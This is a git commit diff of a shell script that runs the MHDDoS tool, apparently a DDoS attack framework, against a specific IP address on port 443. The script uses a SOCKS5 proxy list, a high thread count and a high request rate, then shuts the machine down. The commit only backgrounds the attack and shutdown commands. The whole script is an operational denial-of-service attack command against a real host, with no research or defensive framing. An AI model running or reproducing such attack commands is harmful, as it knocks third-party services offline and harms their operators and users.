a05a146b7875183677dea6f8e71fc98599c83bce
terkozak <101092357+terkozak@users.noreply.github.com>
2022-03-09 02:59:50 -0500

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
-python3 /home/ubuntu/mhddos/start.py bypass 5.61.23.11:443 5 1000 socks5.txt 100000 120;
-sudo shutdown -P +3;
+python3 /home/ubuntu/mhddos/start.py bypass 5.61.23.11:443 5 1000 socks5.txt 100000 120 &
+sudo shutdown -P +3&
